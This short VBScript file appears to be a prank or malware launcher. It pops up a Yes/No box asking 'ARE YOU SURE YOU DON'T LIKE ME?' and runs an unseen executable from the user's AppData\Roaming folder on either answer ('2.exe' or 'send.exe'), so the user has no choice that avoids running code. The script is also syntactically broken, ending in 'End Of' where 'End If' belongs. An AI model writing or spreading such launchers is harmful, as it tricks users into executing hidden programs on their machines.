Set oShell = CreateObject ("WScript.Shell")

intAnswer = _
    Msgbox("ARE YOU SURE YOU DON'T LIKE ME?", _
         vbYesNo, "QUESTION")
If intAnswer = vbYes Then
     oShell.run "%userprofile%/AppData/Roaming/2.exe"
Else
     oShell.run "%userprofile%/AppData/Roaming/send.exe"
End Of 
